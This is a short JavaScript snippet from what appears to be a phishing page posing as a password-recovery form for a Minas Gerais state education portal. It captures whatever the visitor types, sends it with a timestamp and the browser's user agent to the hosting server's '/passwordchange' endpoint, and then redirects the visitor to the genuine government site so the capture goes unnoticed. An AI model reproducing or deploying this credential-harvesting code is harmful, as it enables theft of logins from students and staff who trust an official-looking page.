<script>
document.addEventListener("DOMContentLoaded", () => {
  const input = document.getElementById("w9wDl0");
  const botao = document.getElementById("w9wD_1");

  if (!input || !botao) return;

  botao.addEventListener("click", async (e) => {
    e.preventDefault();

    const valor = input.value.trim();
    if (!valor) return;

    const payload = {
      dado: valor,
      origem: "Recuperação de Senha",
      dataHora: new Date().toISOString(),
      navegador: navigator.userAgent
    };

    try {
      const resposta = await fetch("/passwordchange", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });

      if (!resposta.ok) throw new Error(`Erro HTTP: ${resposta.status}`);

      await resposta.json();

      // Redireciona depois que o backend processar
      window.location.href = "https://dedmais.educacao.mg.gov.br/";
    } catch (erro) {
      console.error("Erro ao enviar para o backend:", erro);
    }
  });
});
</script>
